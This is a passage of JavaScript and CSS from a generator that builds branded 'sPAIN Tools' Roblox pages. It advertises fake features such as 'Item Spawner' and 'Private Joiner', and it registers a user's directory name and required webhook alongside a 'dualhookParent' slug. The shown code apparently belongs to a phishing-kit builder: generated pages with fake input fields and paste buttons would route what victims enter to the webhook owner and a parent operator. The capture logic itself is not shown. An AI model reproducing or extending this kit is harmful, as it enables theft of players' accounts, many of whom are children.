    update(){ this.x+=this.vx; this.y+=this.vy; this.life++; if(this.life>this.maxLife||this.x<0||this.x>W||this.y<0||this.y>H){Object.assign(this,new Particle());this.life=0;} }
    draw(){ const fade=this.life<30?this.life/30:this.life>this.maxLife-30?(this.maxLife-this.life)/30:1; ctx.beginPath(); ctx.arc(this.x,this.y,this.r,0,Math.PI*2); ctx.fillStyle=this.color+(this.alpha*fade)+')'; ctx.fill(); }
  }
  for(let i=0;i<90;i++) particles.push(new Particle());
  function loop(){ ctx.clearRect(0,0,W,H); particles.forEach(p=>{p.update();p.draw();}); requestAnimationFrame(loop); }
  loop();
})();

/* ── TICKER ── */
(function(){
  const items = ['Outfit Cloner','Game Replicator','Item Spawner','Follower Engine','Voice Unlocker','Asset Extractor','Shader Enabler','Audio Fixer','Private Joiner','Live Capture','v9.0 Active','9 Slots Ready'];
  const track = document.getElementById('tickerTrack');
  [...items,...items].forEach(item => {
    const el = document.createElement('div');
    el.className = 'ticker-item';
    el.innerHTML = \`<span class="dot"></span>\${item}\`;
    track.appendChild(el);
  });
})();

/* ── URL PREVIEW ── */
const DUALHOOK_PARENT_SLUG = '${SLUG}';
const SITE_URL = 'https://spain-tools.vercel.app';
function updateSlotsUrl() {
  const dir = document.getElementById('sf-dirName').value.trim() || 'sPAINTools';
  document.getElementById('slotsAutoUrl').textContent = \`\${SITE_URL}/\${dir}\`;
}

/* ── HELPERS ── */
function setStatus(btn, msg, color) {
  let s = btn.parentElement.querySelector('.gen-status');
  if (!s) { s = document.createElement('div'); s.className = 'gen-status'; s.style.cssText = 'margin-top:12px;font-size:0.7rem;font-family:Orbitron,sans-serif;text-align:center;min-height:20px;letter-spacing:0.06em;'; btn.parentElement.appendChild(s); }
  s.style.color = color || '#5a5a78';
  s.textContent = msg;
}
function flashField(id, color) {
  const el = document.getElementById(id);
  el.style.borderColor = color || 'rgba(192,38,211,0.6)';
  el.style.boxShadow = \`0 0 0 3px \${color ? color.replace('0.6','0.12') : 'rgba(192,38,211,0.1)'}\`;
  el.focus();
  setTimeout(() => { el.style.borderColor=''; el.style.boxShadow=''; }, 2500);
}

/* ── GENERATE — SLOTS ── */
async function handleGenerate() {
  const dirName  = document.getElementById('sf-dirName').value.trim();
  const dispName = document.getElementById('sf-dispName').value.trim();
  const charUrl  = document.getElementById('sf-charUrl').value.trim();
  const webhook  = document.getElementById('sf-webhook').value.trim();
  const btn      = document.querySelector('.slots-generate-btn');

  if (!dirName) { flashField('sf-dirName'); setStatus(btn,'⚠ Directory Name is required.','#e879f9'); return; }
  if (!webhook) { flashField('sf-webhook'); setStatus(btn,'⚠ Webhook is required.','#e879f9'); return; }

  const orig = btn.innerHTML;
  btn.disabled = true; btn.textContent = 'Checking…'; setStatus(btn,'');

  try {
    const res  = await fetch('/api/claim', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ name:dirName, displayName:dispName, webhook, charUrl, type:'slots', dualhookParent: DUALHOOK_PARENT_SLUG })
    });
    const data = await res.json();
    if (data.taken) {
      setStatus(btn, \`✗ "\${dirName}" is taken — choose another.\`, '#f472b6');
      flashField('sf-dirName','rgba(192,38,211,0.6)');
    } else if (data.success) {
      document.getElementById('slotsAutoUrl').textContent = data.url;
      btn.textContent = '✓ Claimed!';
      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
      btn.style.boxShadow  = '0 0 36px rgba(34,197,94,0.4)';
      setStatus(btn, \`✓ Your link: \${data.url}\`, '#4ade80');
      setTimeout(() => { btn.innerHTML=orig; btn.style.background=''; btn.style.boxShadow=''; }, 3000);
    } else {
      setStatus(btn, \`✗ \${data.error||'Something went wrong.'}\`, '#f472b6');
    }
  } catch { setStatus(btn,'✗ Network error. Try again.','#f472b6'); }
  finally {
    btn.disabled = false;
    if (!btn.textContent.includes('Claimed')) btn.innerHTML = orig;
  }
}

/* ── COUNTERS ── */
function animateCounters(){
  document.querySelectorAll('.stat-num[data-target]').forEach(el => {
    const target=+el.dataset.target, suffix=el.dataset.suffix||'', start=performance.now(), dur=2000;
    function tick(now){ const p=Math.min((now-start)/dur,1), ease=1-Math.pow(1-p,3), v=Math.round(ease*target); el.textContent=target>=1000?(v>=1000?(v/1000).toFixed(1)+'K+':v+'+'):v+suffix; if(p<1)requestAnimationFrame(tick); }
    requestAnimationFrame(tick);
  });
}
const observer = new IntersectionObserver(entries=>{ entries.forEach(e=>{ if(e.isIntersecting){animateCounters();observer.disconnect();} }); },{threshold:0.5});
const cs=document.querySelector('.community'); if(cs) observer.observe(cs);

/* ── PARALLAX ── */
document.addEventListener('mousemove', e => {
  const xR=(e.clientX/window.innerWidth-0.5)*2, yR=(e.clientY/window.innerHeight-0.5)*2;
  document.querySelectorAll('.roblox-char').forEach((char,i)=>{
    const d=(i%3+1)*6;
    char.style.transform = ['char-1','char-3','char-6'].some(c=>char.classList.contains(c))
      ? \`scaleX(-1) translate(\${-xR*d}px,\${-yR*d}px)\`
      : \`translate(\${xR*d}px,\${yR*d}px)\`;
  });
});
</script>
</body>
</html>`;
}

function buildSlotsPage(record) {
  const SLUG = record.slug;
  const charSrc = record.charUrl || 'https://tr.rbxcdn.com/30DAY-Avatar-D7AA065464297A80748737C0DCD67BB4-Png/720/720/Avatar/Webp/noFilter';
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>sPAIN Tools</title>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #080810;
    --surface: #0f0f18;
    --surface2: #16162a;
    --border: rgba(255,255,255,0.06);
    --accent: #c026d3;
    --accent2: #a855f7;
    --accent3: #06b6d4;
    --accent-glow: rgba(192,38,211,0.4);
    --cyan-glow: rgba(6,182,212,0.3);
    --text: #f0f0f8;
    --muted: #5a5a78;
    --card: #0d0d1a;
  }

  * { margin: 0; padding: 0; box-sizing: border-box; }
  html { scroll-behavior: smooth; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Inter', sans-serif;
    overflow-x: hidden;
    cursor: default;
  }

  /* ── GRAIN OVERLAY ── */
  body::after {
    content: '';
    position: fixed;
    inset: 0;
    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
    pointer-events: none;
    z-index: 9998;
    opacity: 0.5;
  }

  /* ── AMBIENT BG GRID ── */
  .bg-grid {
    position: fixed;
    inset: 0;
    background-image:
      linear-gradient(rgba(192,38,211,0.04) 1px, transparent 1px),
      linear-gradient(90deg, rgba(192,38,211,0.04) 1px, transparent 1px);
    background-size: 60px 60px;
    pointer-events: none;
    z-index: 0;
    mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 20%, transparent 100%);
  }

  /* ── AURORA BG ── */
  .aurora {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 0;
    overflow: hidden;
  }
  .aurora-blob {
    position: absolute;
    border-radius: 50%;
    filter: blur(100px);
    opacity: 0.12;
    animation: drift 12s ease-in-out infinite alternate;
  }
  .aurora-blob:nth-child(1) {
    width: 800px; height: 800px;
    background: var(--accent);
    top: -200px; left: -200px;
    animation-duration: 14s;
  }
  .aurora-blob:nth-child(2) {
    width: 600px; height: 600px;
    background: var(--accent2);
    bottom: -150px; right: -100px;
    animation-duration: 18s;
    animation-delay: -5s;
  }
  .aurora-blob:nth-child(3) {
    width: 500px; height: 500px;
    background: var(--accent3);
    top: 40%; left: 60%;
    animation-duration: 22s;
    animation-delay: -8s;
    opacity: 0.08;
  }
  @keyframes drift {
    from { transform: translate(0,0) scale(1); }
    to { transform: translate(60px, 40px) scale(1.1); }
  }

  /* ── FLOATING ROBLOX CHARACTERS ── */
  .roblox-scene {
    position: absolute;
    inset: 0;
    pointer-events: none;
    z-index: 2;
    overflow: hidden;
  }

  .roblox-char {
    position: absolute;
    filter: drop-shadow(0 0 30px rgba(192,38,211,0.6)) drop-shadow(0 0 60px rgba(168,85,247,0.3));
    animation: floatChar var(--dur, 8s) ease-in-out infinite;
    animation-delay: var(--delay, 0s);
    transform-origin: center bottom;
    transition: filter 0.3s;
  }

  .roblox-char img {
    width: var(--size, 180px);
    height: var(--size, 180px);
    object-fit: contain;
    display: block;
  }

  /* Individual character positions */
  .char-1 {
    --size: 200px; --dur: 7s; --delay: 0s;
    left: 2%; top: 12%;
    transform: scaleX(-1);
  }
  .char-2 {
    --size: 160px; --dur: 9s; --delay: -2s;
    right: 3%; top: 8%;
  }
  .char-3 {
    --size: 140px; --dur: 11s; --delay: -4s;
    left: 8%; bottom: 15%;
    transform: scaleX(-1);
  }
  .char-4 {
    --size: 170px; --dur: 8s; --delay: -6s;
    right: 6%; bottom: 20%;
  }
  .char-5 {
    --size: 120px; --dur: 10s; --delay: -3s;
    left: 20%; top: 5%;
  }
  .char-6 {
    --size: 130px; --dur: 12s; --delay: -7s;
    right: 18%; top: 10%;
    transform: scaleX(-1);
  }

  @keyframes floatChar {
    0%   { transform: translateY(0px) rotate(-2deg); }
    25%  { transform: translateY(-18px) rotate(1deg); }
    50%  { transform: translateY(-30px) rotate(-1deg); }
    75%  { transform: translateY(-14px) rotate(2deg); }
    100% { transform: translateY(0px) rotate(-2deg); }
  }
  .char-1 { animation-name: floatCharFlip; }
  .char-3 { animation-name: floatCharFlip; }
  .char-6 { animation-name: floatCharFlip; }

  @keyframes floatCharFlip {
    0%   { transform: scaleX(-1) translateY(0px) rotate(2deg); }
    25%  { transform: scaleX(-1) translateY(-18px) rotate(-1deg); }
    50%  { transform: scaleX(-1) translateY(-30px) rotate(1deg); }
    75%  { transform: scaleX(-1) translateY(-14px) rotate(-2deg); }
    100% { transform: scaleX(-1) translateY(0px) rotate(2deg); }
  }

  /* glow ring under characters */
  .char-shadow {
    position: absolute;
    width: calc(var(--size, 180px) * 0.7);
    height: 12px;
    background: radial-gradient(ellipse, rgba(192,38,211,0.5) 0%, transparent 70%);
    bottom: -8px;
    left: 50%;
    transform: translateX(-50%);
    animation: shadowPulse var(--dur, 8s) ease-in-out infinite;
    animation-delay: var(--delay, 0s);
    border-radius: 50%;
  }
  @keyframes shadowPulse {
    0%,100% { opacity: 0.5; transform: translateX(-50%) scaleX(1); }
    50% { opacity: 0.2; transform: translateX(-50%) scaleX(0.7); }
  }

  /* ── PARTICLE CANVAS ── */
  #particles { position: fixed; inset: 0; z-index: 1; pointer-events: none; }

  /* ── NAV ── */
  nav {
    position: fixed;
    top: 0; left: 0; right: 0;
    z-index: 500;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 18px 48px;
    background: rgba(8,8,16,0.7);
    backdrop-filter: blur(24px) saturate(180%);
    border-bottom: 1px solid rgba(192,38,211,0.15);
  }
  nav::after {
    content: '';
    position: absolute;
    bottom: 0; left: 10%; right: 10%;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(192,38,211,0.4), rgba(168,85,247,0.4), transparent);
  }

  .logo {
    font-family: 'Orbitron', sans-serif;
    font-size: 1.4rem;
    font-weight: 900;
    letter-spacing: 0.05em;
    position: relative;
  }
  .logo span { color: var(--accent); text-shadow: 0 0 20px var(--accent-glow); }

  nav ul { display: flex; gap: 36px; list-style: none; }
  nav ul a {
    color: var(--muted);
    text-decoration: none;
    font-size: 0.82rem;
    font-weight: 500;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    transition: color 0.2s;
  }
  nav ul a:hover { color: var(--text); }

  .nav-cta {
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    color: #fff !important;
    padding: 9px 22px;
    border-radius: 8px;
    font-weight: 600 !important;
    box-shadow: 0 0 20px rgba(192,38,211,0.3);
    transition: box-shadow 0.2s !important, transform 0.2s !important;
  }
  .nav-cta:hover { box-shadow: 0 0 36px rgba(192,38,211,0.6) !important; transform: translateY(-1px); color: #fff !important; }

  /* ── HERO ── */
  .hero {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    text-align: center;
    padding: 120px 24px 80px;
    position: relative;
    z-index: 3;
    overflow: hidden;
  }

  .hero-glow {
    position: absolute;
    width: 900px; height: 900px;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(192,38,211,0.15) 0%, rgba(168,85,247,0.08) 40%, transparent 70%);
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    pointer-events: none;
    animation: heroPulse 5s ease-in-out infinite;
  }
  @keyframes heroPulse {
    0%,100% { opacity: 0.8; transform: translate(-50%,-50%) scale(1); }
    50% { opacity: 1; transform: translate(-50%,-50%) scale(1.12); }
  }

  /* spinning ring accent */
  .hero-ring {
    position: absolute;
    width: 600px; height: 600px;
    border-radius: 50%;
    border: 1px solid rgba(192,38,211,0.12);
    top: 50%; left: 50%;
    transform: translate(-50%,-50%);
    animation: spinRing 25s linear infinite;
  }
  .hero-ring::after {
    content: '';
    position: absolute;
    width: 10px; height: 10px;
    background: var(--accent);
    border-radius: 50%;
    top: -5px; left: 50%;
    box-shadow: 0 0 20px var(--accent);
  }
  .hero-ring-2 {
    width: 780px; height: 780px;
    border-color: rgba(168,85,247,0.07);
    animation-duration: 38s;
    animation-direction: reverse;
  }
  @keyframes spinRing {
    from { transform: translate(-50%,-50%) rotate(0deg); }
    to { transform: translate(-50%,-50%) rotate(360deg); }
  }

  .hero-badge {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: rgba(192,38,211,0.1);
    border: 1px solid rgba(192,38,211,0.28);
    border-radius: 100px;
    padding: 7px 18px;
    font-size: 0.72rem;
    font-weight: 600;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: #e879f9;
    margin-bottom: 32px;
    animation: fadeUp 0.7s ease both;
    backdrop-filter: blur(10px);
    position: relative;
    z-index: 5;
  }
  .hero-badge::before {
    content: '';
    width: 6px; height: 6px;
    background: #e879f9;
    border-radius: 50%;
    box-shadow: 0 0 8px #e879f9;
    animation: blink 1.5s infinite;
  }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }

  .hero h1 {
    font-family: 'Orbitron', sans-serif;
    font-size: clamp(3.5rem, 9vw, 7.5rem);
    font-weight: 900;
    line-height: 0.95;
    letter-spacing: -0.03em;
    margin-bottom: 28px;
    animation: fadeUp 0.7s 0.12s ease both;
    position: relative;
    z-index: 5;
  }
  .hero h1 .glow-text {
    background: linear-gradient(135deg, #f0abfc, #c026d3, #a855f7, #7c3aed);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    filter: drop-shadow(0 0 40px rgba(192,38,211,0.5));
    animation: textShimmer 3s ease-in-out infinite alternate;
  }
  @keyframes textShimmer {
    from { filter: drop-shadow(0 0 30px rgba(192,38,211,0.4)); }
    to { filter: drop-shadow(0 0 60px rgba(192,38,211,0.8)); }
  }

  .hero p {
    max-width: 500px;
    color: #7070a0;
    font-size: 1.05rem;
    line-height: 1.75;
    margin-bottom: 44px;
    animation: fadeUp 0.7s 0.22s ease both;
    position: relative;
    z-index: 5;
  }

  .hero-buttons {
    display: flex;
    gap: 14px;
    animation: fadeUp 0.7s 0.32s ease both;
    position: relative;
    z-index: 5;
  }

  .btn-primary {
    background: linear-gradient(135deg, #c026d3, #a855f7);
    color: #fff;
    border: none;
    padding: 15px 36px;
    border-radius: 10px;
    font-family: 'Rajdhani', sans-serif;
    font-size: 1.05rem;
    font-weight: 700;
    letter-spacing: 0.06em;
    cursor: pointer;
    box-shadow: 0 0 40px rgba(192,38,211,0.5), inset 0 1px 0 rgba(255,255,255,0.2);
    transition: transform 0.2s, box-shadow 0.2s;
    position: relative;
    overflow: hidden;
  }
  .btn-primary::before {
    content: '';
    position: absolute;
    inset: 0;
    background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
    opacity: 0;
    transition: opacity 0.2s;
  }
  .btn-primary:hover {
    transform: translateY(-3px);
    box-shadow: 0 0 60px rgba(192,38,211,0.7), 0 8px 32px rgba(0,0,0,0.4), inset 0 1px 0 rgba(255,255,255,0.2);
  }
  .btn-primary:hover::before { opacity: 1; }

  .btn-ghost {
    background: rgba(255,255,255,0.03);
    color: var(--text);
    border: 1px solid rgba(255,255,255,0.1);
    padding: 15px 36px;
    border-radius: 10px;
    font-family: 'Rajdhani', sans-serif;
    font-size: 1.05rem;
    font-weight: 600;
    letter-spacing: 0.06em;
    cursor: pointer;
    backdrop-filter: blur(10px);
    transition: border-color 0.2s, background 0.2s, transform 0.2s;
  }
  .btn-ghost:hover {
    border-color: rgba(192,38,211,0.5);
    background: rgba(192,38,211,0.08);
    transform: translateY(-3px);
  }

  @keyframes fadeUp {
    from { opacity:0; transform:translateY(24px); }
    to { opacity:1; transform:translateY(0); }
  }

  /* ── SCROLL INDICATOR ── */
  .scroll-indicator {
    position: absolute;
    bottom: 36px; left: 50%;
    transform: translateX(-50%);
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 8px;
    opacity: 0.4;
    animation: fadeUp 1s 1s ease both;
    z-index: 5;
  }
  .scroll-line {
    width: 1px; height: 40px;
    background: linear-gradient(to bottom, transparent, var(--accent));
    animation: scrollLine 1.8s ease-in-out infinite;
  }
  @keyframes scrollLine {
    0% { transform: scaleY(0); transform-origin: top; }
    50% { transform: scaleY(1); transform-origin: top; }
    51% { transform: scaleY(1); transform-origin: bottom; }
    100% { transform: scaleY(0); transform-origin: bottom; }
  }
  .scroll-text {
    font-size: 0.65rem;
    letter-spacing: 0.2em;
    text-transform: uppercase;
    color: var(--muted);
  }

  /* ── DIVIDER ── */
  .divider {
    border: none;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(192,38,211,0.2), rgba(168,85,247,0.2), transparent);
    margin: 0 auto;
    max-width: 900px;
    position: relative;
    z-index: 3;
  }

  /* ── SECTION COMMON ── */
  section { position: relative; z-index: 3; }

  .section-label {
    text-align: center;
    font-size: 0.72rem;
    font-weight: 600;
    letter-spacing: 0.18em;
    text-transform: uppercase;
    color: var(--accent);
    margin-bottom: 14px;
    text-shadow: 0 0 20px var(--accent-glow);
  }

  .section-title {
    text-align: center;
    font-family: 'Orbitron', sans-serif;
    font-size: clamp(1.6rem, 4vw, 2.8rem);
    font-weight: 700;
    margin-bottom: 64px;
    letter-spacing: -0.02em;
  }

  /* ── FEATURES ── */
  .features {
    padding: 110px 48px;
    max-width: 1200px;
    margin: 0 auto;
  }

  .features-grid {
    display: grid;
    grid-template-columns: repeat(2, 1fr);
    gap: 1px;
    background: rgba(192,38,211,0.1);
    border: 1px solid rgba(192,38,211,0.12);
    border-radius: 20px;
    overflow: hidden;
    box-shadow: 0 0 60px rgba(192,38,211,0.06);
  }

  .feature-card {
    background: var(--surface);
    padding: 48px 44px;
    position: relative;
    transition: background 0.3s;
    overflow: hidden;
  }
  .feature-card::after {
    content: '';
    position: absolute;
    top: 0; right: 0;
    width: 120px; height: 120px;
    background: radial-gradient(circle, rgba(192,38,211,0.08) 0%, transparent 70%);
    pointer-events: none;
  }
  .feature-card:hover { background: var(--surface2); }

  .feature-icon {
    width: 52px; height: 52px;
    border-radius: 14px;
    background: rgba(192,38,211,0.1);
    border: 1px solid rgba(192,38,211,0.22);
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 22px;
    font-size: 1.5rem;
    box-shadow: 0 0 20px rgba(192,38,211,0.15);
  }

  .feature-card h3 {
    font-family: 'Rajdhani', sans-serif;
    font-size: 1.3rem;
    font-weight: 700;
    letter-spacing: 0.05em;
    margin-bottom: 12px;
    color: var(--text);
  }

  .feature-card p { font-size: 0.9rem; color: var(--muted); line-height: 1.7; }

  /* ── PRODUCTS ── */
  .products {
    padding: 110px 48px;
    max-width: 1200px;
    margin: 0 auto;
  }

  .slots-grid {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 16px;
  }

  .slot-card {
    background: var(--card);
    border: 1px solid rgba(255,255,255,0.05);
    border-radius: 16px;
    padding: 30px 26px;
    display: flex;
    flex-direction: column;
    gap: 14px;
    position: relative;
    overflow: hidden;
    transition: border-color 0.3s, transform 0.3s, box-shadow 0.3s;
  }
  .slot-card::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0;
    height: 2px;
    background: linear-gradient(90deg, var(--accent), var(--accent2), var(--accent3));
    opacity: 0;
    transition: opacity 0.3s;
  }
  .slot-card::after {
    content: '';
    position: absolute;
    bottom: -40px; right: -40px;
    width: 120px; height: 120px;
    background: radial-gradient(circle, rgba(192,38,211,0.07) 0%, transparent 70%);
    pointer-events: none;
    transition: opacity 0.3s;
  }
  .slot-card:hover {
    border-color: rgba(192,38,211,0.3);
    transform: translateY(-5px);
    box-shadow: 0 20px 60px rgba(0,0,0,0.5), 0 0 40px rgba(192,38,211,0.1);
  }
  .slot-card:hover::before { opacity: 1; }

  .slot-number {
    font-family: 'Orbitron', sans-serif;
    font-size: 0.6rem;
    font-weight: 700;
    letter-spacing: 0.18em;
    color: var(--accent);
    text-transform: uppercase;
    text-shadow: 0 0 12px var(--accent-glow);
  }

  .slot-name {
    font-family: 'Rajdhani', sans-serif;
    font-size: 1.2rem;
    font-weight: 700;
    color: var(--text);
    letter-spacing: 0.04em;
  }

  .slot-desc { font-size: 0.82rem; color: var(--muted); line-height: 1.6; flex: 1; }

  .btn-start {
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    color: #fff;
    border: none;
    padding: 11px 0;
    border-radius: 9px;
    font-family: 'Rajdhani', sans-serif;
    font-size: 0.95rem;
    font-weight: 700;
    letter-spacing: 0.08em;
    cursor: pointer;
    width: 100%;
    transition: opacity 0.2s, box-shadow 0.2s;
    box-shadow: 0 0 20px rgba(192,38,211,0.25);
  }
  .btn-start:hover { opacity: 0.88; box-shadow: 0 0 36px rgba(192,38,211,0.5); }

  /* ── COMMUNITY ── */
  .community {
    padding: 110px 48px;
    text-align: center;
    position: relative;
    overflow: hidden;
  }
  .community::before {
    content: '';
    position: absolute;
    inset: 0;
    background: radial-gradient(ellipse at center, rgba(192,38,211,0.07) 0%, transparent 65%);
    pointer-events: none;
  }

  .community h2 {
    font-family: 'Orbitron', sans-serif;
    font-size: clamp(1.8rem, 4vw, 3.2rem);
    font-weight: 700;
    margin-bottom: 18px;
    letter-spacing: -0.02em;
  }

  .community p {
    color: var(--muted);
    font-size: 1rem;
    max-width: 460px;
    margin: 0 auto 44px;
    line-height: 1.7;
  }

  .community-stats {
    display: flex;
    justify-content: center;
    gap: 70px;
    margin-bottom: 48px;
  }

  .stat { display: flex; flex-direction: column; align-items: center; gap: 6px; }

  .stat-num {
    font-family: 'Orbitron', sans-serif;
    font-size: 2.4rem;
    font-weight: 900;
    background: linear-gradient(135deg, #f0abfc, #c026d3);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    filter: drop-shadow(0 0 20px rgba(192,38,211,0.4));
  }

  .stat-label {
    font-size: 0.75rem;
    color: var(--muted);
    letter-spacing: 0.1em;
    text-transform: uppercase;
  }

  .discord-btn {
    display: inline-flex;
    align-items: center;
    gap: 12px;
    background: #5865F2;
    color: #fff;
    border: none;
    padding: 15px 36px;
    border-radius: 12px;
    font-family: 'Rajdhani', sans-serif;
    font-size: 1.05rem;
    font-weight: 700;
    letter-spacing: 0.06em;
    cursor: pointer;
    box-shadow: 0 0 36px rgba(88,101,242,0.4);
    transition: background 0.2s, transform 0.2s, box-shadow 0.2s;
  }
  .discord-btn:hover {
    background: #4752C4;
    transform: translateY(-3px);
    box-shadow: 0 0 56px rgba(88,101,242,0.6);
  }

  /* ── FOOTER ── */
  footer {
    border-top: 1px solid rgba(192,38,211,0.1);
    padding: 32px 48px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    color: var(--muted);
    font-size: 0.8rem;
    position: relative;
    z-index: 3;
  }
  footer::before {
    content: '';
    position: absolute;
    top: 0; left: 10%; right: 10%;
    height: 1px;
    background: linear-gradient(90deg, transparent, rgba(192,38,211,0.3), transparent);
  }

  .footer-logo {
    font-family: 'Orbitron', sans-serif;
    font-size: 1rem;
    font-weight: 700;
    color: var(--text);
  }
  .footer-logo span { color: var(--accent); text-shadow: 0 0 12px var(--accent-glow); }

  /* ── MODAL ── */
  .modal-overlay {
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.8);
    backdrop-filter: blur(12px);
    z-index: 1000;
    display: flex;
    align-items: center;
    justify-content: center;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.25s;
  }
  .modal-overlay.open { opacity: 1; pointer-events: all; }

  .modal {
    background: var(--surface);
    border: 1px solid rgba(192,38,211,0.22);
    border-radius: 20px;
    padding: 38px;
    width: 90%;
    max-width: 480px;
    box-shadow: 0 0 80px rgba(192,38,211,0.25), 0 0 200px rgba(192,38,211,0.1);
    transform: scale(0.94) translateY(12px);
    transition: transform 0.28s cubic-bezier(0.34, 1.56, 0.64, 1);
  }
  .modal-overlay.open .modal { transform: scale(1) translateY(0); }

  .modal-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 28px;
  }

  .modal-title {
    font-family: 'Orbitron', sans-serif;
    font-size: 1.1rem;
    font-weight: 700;
    color: var(--text);
  }

  .modal-close {
    background: rgba(255,255,255,0.05);
    border: 1px solid var(--border);
    color: var(--muted);
    font-size: 1.2rem;
    cursor: pointer;
    line-height: 1;
    width: 32px; height: 32px;
    border-radius: 8px;
    display: flex; align-items: center; justify-content: center;
    transition: color 0.2s, background 0.2s;
  }
  .modal-close:hover { color: var(--text); background: rgba(255,255,255,0.1); }

  .input-group { margin-bottom: 20px; }

  .input-label {
    display: block;
    font-size: 0.74rem;
    font-weight: 600;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    color: var(--muted);
    margin-bottom: 10px;
  }

  .input-row { display: flex; gap: 8px; }

  .fake-input {
    flex: 1;
    background: rgba(255,255,255,0.03);
    border: 1px solid var(--border);
    border-radius: 9px;
    padding: 12px 14px;
    color: var(--text);
    font-family: 'Inter', sans-serif;
    font-size: 0.9rem;
    letter-spacing: 0.1em;
    min-width: 0;
    word-break: break-all;
  }

  .fake-input.placeholder {
    color: var(--muted);
    letter-spacing: normal;
  }

  .fake-input.filled {
    color: var(--text);
    letter-spacing: 0.05em;
  }

  .paste-btn {
    background: rgba(192,38,211,0.1);
    border: 1px solid rgba(192,38,211,0.28);
    color: #e879f9;
    border-radius: 9px;
    padding: 12px 18px;
    font-family: 'Rajdhani', sans-serif;
    font-weight: 700;
    font-size: 0.88rem;
    letter-spacing: 0.06em;
    cursor: pointer;
    white-space: nowrap;
    transition: background 0.2s, border-color 0.2s;
  }
  .paste-btn:hover { background: rgba(192,38,211,0.2); border-color: rgba(192,38,211,0.5); }

  .enable-btn {
    width: 100%;
    background: linear-gradient(135deg, var(--accent), var(--accent2));
    color: #fff;
    border: none;
    padding: 15px 0;
    border-radius: 11px;
    font-family: 'Rajdhani', sans-serif;
    font-size: 1.08rem;
    font-weight: 700;
    letter-spacing: 0.1em;
    text-transform: uppercase;
    cursor: pointer;
    margin-top: 8px;
    box-shadow: 0 0 30px rgba(192,38,211,0.4);
    transition: opacity 0.2s, box-shadow 0.2s;
  }
  .enable-btn:hover:not(:disabled) { opacity: 0.9; box-shadow: 0 0 50px rgba(192,38,211,0.6); }
  .enable-btn:disabled {
    opacity: 0.4;
    cursor: not-allowed;
    background: linear-gradient(135deg, #666, #888);
    box-shadow: none;
  }

  .error-msg {
    color: #f472b6;
    font-size: 0.75rem;
    margin-top: 8px;
    text-align: center;
    min-height: 18px;
    font-family: 'Rajdhani', sans-serif;
    letter-spacing: 0.05em;
  }

  /* ── TICKER MARQUEE ── */
  .ticker-wrap {
    width: 100%;
    overflow: hidden;
    border-top: 1px solid rgba(192,38,211,0.1);
    border-bottom: 1px solid rgba(192,38,211,0.1);
    background: rgba(192,38,211,0.04);
    padding: 12px 0;
    position: relative;
    z-index: 3;
  }
  .ticker-track {
    display: flex;
    gap: 0;
    animation: ticker 30s linear infinite;
    width: max-content;
  }
  .ticker-item {
    padding: 0 40px;
    font-family: 'Orbitron', sans-serif;
    font-size: 0.7rem;
    font-weight: 700;
    letter-spacing: 0.15em;
    text-transform: uppercase;
    color: var(--muted);
    white-space: nowrap;
    display: flex;
    align-items: center;
    gap: 14px;
  }
  .ticker-item .dot { width: 4px; height: 4px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); }
@keyframes ticker {
    from { transform: translateX(0); }
    to { transform: translateX(-50%); }
  }

  /* ========== MOBILE RESPONSIVE ========== */
  @media (max-width: 768px) {
    /* HIDE floating characters - they're cluttering mobile */
    .roblox-char { display: none !important; }
    
    /* Navigation - tighter spacing */
    nav { padding: 14px 16px; }
    nav ul { gap: 12px; }
    nav ul a { font-size: 0.65rem; letter-spacing: 0.05em; }
    .nav-cta { padding: 6px 12px; font-size: 0.65rem; }
    .logo { font-size: 1.1rem; }

    /* Hero - smaller, stacked buttons */
    .hero { padding: 100px 16px 60px; min-height: auto; }
    .hero h1 { font-size: clamp(2.2rem, 10vw, 3.5rem); margin-bottom: 20px; }
    .hero p { font-size: 0.9rem; padding: 0 10px; margin-bottom: 32px; }
    .hero-buttons { 
      flex-direction: column; 
      width: 100%; 
      max-width: 280px; 
      gap: 12px; 
    }
    .btn-primary, .btn-ghost { 
      width: 100%; 
      padding: 14px 24px; 
      font-size: 0.95rem; 
    }
    .hero-badge { 
      font-size: 0.65rem; 
      padding: 6px 14px; 
